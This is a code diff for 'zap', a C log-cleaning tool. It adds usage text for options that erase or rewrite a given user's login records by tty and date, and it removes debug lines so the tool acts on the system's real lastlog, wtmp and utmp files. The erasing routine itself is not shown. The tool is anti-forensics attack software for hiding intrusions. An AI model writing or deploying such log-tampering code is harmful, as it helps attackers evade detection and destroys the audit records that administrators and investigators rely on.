@@ -4,6 +4,19 @@
 void usage()
 {
     printf("Usage:\n");
+    printf("* zap -A <username>\n");
+    printf("\tErase all logs\n");
+    printf("\n");
+    printf("* zap -a <username> [-t <tty>] [-d <mmddyy>]\n");
+    printf("\tErase with filters\n");
+    printf("\t-t <tty> : Specify tty\n");
+    printf("\t-d <mmddyy> : Specify date\n");
+    printf("\n");
+    printf("* zap -R <username1> <username1> [-t <tty1> <tty2>] [-d <mmddyy1> <mmddyy2>]\n");
+    printf("\tReplace with filters\n");
+    printf("\t-t <tty1> <tty2> : Specify tty and replace <tty1> to <tty2>\n");
+    printf("\t-d <mmddyy1> <mmddyy2> : Specify date and replace <mmddyy1> to <mmddyy2>\n");
+    printf("\n");
     exit(EXIT_FAILURE);
 }
 
@@ -70,8 +83,6 @@ int main(int argc, char *argv[])
         }
     }
 
-    // printf("flag: %d %d %d\n", flag_a, flag_A, flag_R);
-
     if (!(flag_a || flag_A || flag_R))
     {
         usage();
@@ -79,14 +90,9 @@ int main(int argc, char *argv[])
     }
 
     strncpy(lastlog_path, _PATH_LASTLOG, strlen(_PATH_LASTLOG) + 1);
-    // strncpy(lastlog_path, "./lastlog", strlen("./lastlog") + 1);
-    // printf("lastlog_path: %s\n", lastlog_path);
-
     strncpy(path, _PATH_WTMP, strlen(_PATH_WTMP) + 1);
-    // strncpy(path, "./wtmp", strlen("./wtmp") + 1);
     zap2();
     strncpy(path, _PATH_UTMP, strlen(_PATH_UTMP) + 1);
-    // strncpy(path, "./utmp", strlen("./utmp") + 1);
     zap2();
     printf("Zap!\n");
     exit(EXIT_SUCCESS);
